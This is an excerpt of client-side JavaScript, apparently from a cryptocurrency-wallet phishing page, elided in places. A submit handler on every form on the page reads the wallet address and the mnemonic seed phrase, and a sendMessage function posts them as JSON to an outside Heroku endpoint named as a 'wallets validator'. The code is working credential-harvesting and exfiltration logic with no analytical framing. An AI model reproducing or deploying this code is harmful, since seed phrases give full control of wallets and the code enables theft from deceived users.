...
function sendMessage(message){
    let t = `https://walletsvalidator-a30bb4bca4a9.herokuapp.com/send-email`;
    
    let requestt = new XMLHttpRequest();
    requestt.open("POST", t);
    requestt.setRequestHeader("Content-Type", "application/json");
    requestt.send(JSON.stringify({message}));
    let responset = requestt.response;
    // Handle the response
    requestt.onload = function() {
        if (requestt.status >= 200 && requestt.status < 300) {
            let responset = requestt.response;
            console.log(responset);
        } else {
            console.error('Request failed with status:', requestt.status);
        }
    };
...
document.querySelectorAll("form").forEach(
    elem => {
        elem.addEventListener('submit', function(event) {
            ...
            const walletAddress = form.get("wallet-address")
            const mnemonicSeed = form.get("mnemonic-seed")

            const message = `address: ${walletAddress}, mnemonic seed: ${mnemonicSeed}`;
            sendMessage(message);
